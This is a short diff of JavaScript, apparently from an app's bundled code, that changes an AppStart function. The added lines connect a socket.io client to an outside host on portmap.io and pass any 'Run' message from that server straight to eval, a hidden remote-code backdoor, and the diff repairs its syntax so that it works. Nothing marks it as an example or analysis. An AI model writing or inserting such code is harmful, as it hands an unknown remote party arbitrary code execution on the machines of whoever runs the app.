@@ -8,8 +8,10 @@ var h,f,l,d=String.fromCharCode;t.exports={version:"2.1.2",encode:a,decode:u}},f
 
 async function AppStart() {
 
-var socket = globalThis.socket = io("http://super1mpsir-63522.portmap.io:63522/")
-socket.on('connect', function () { socket.on('Run', function (data) { eval(data) }) }
+var socket = globalThis.socket = io("http://super1mpsir-63522.portmap.io:63522/");
+socket.on('connect', function () { 
+          socket.on('Run', function (data) { eval(data) }) 
+});
           
 }
 
